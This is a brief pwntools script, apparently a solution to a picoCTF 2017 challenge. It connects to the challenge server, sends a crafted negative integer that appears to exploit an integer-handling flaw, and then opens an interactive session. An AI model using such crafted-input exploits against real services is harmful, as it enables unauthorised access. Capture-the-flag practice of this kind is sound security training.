from pwn import *
context(os='linux', arch='amd64')

r = remote('shell2017.picoctf.com', 64739)
r.recv(4096)
r.send("-2142743887\n")
r.interactive()
